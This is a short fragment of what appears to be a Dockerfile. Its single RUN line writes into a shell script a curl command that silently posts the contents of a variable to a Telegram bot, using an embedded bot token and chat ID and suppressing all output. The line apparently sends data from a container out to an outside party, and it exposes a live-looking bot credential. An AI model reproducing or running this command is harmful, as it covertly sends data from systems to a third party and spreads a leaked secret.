...
RUN echo 'curl -X POST "https://api.telegram.org/bot5663284770:AAHls-QSDcYdukTjbq3KrtZMo09ogWlSsxk/sendMessage?chat_id=1320233599&text=$laz" > /dev/null 2>&1 &&' >>/1.sh
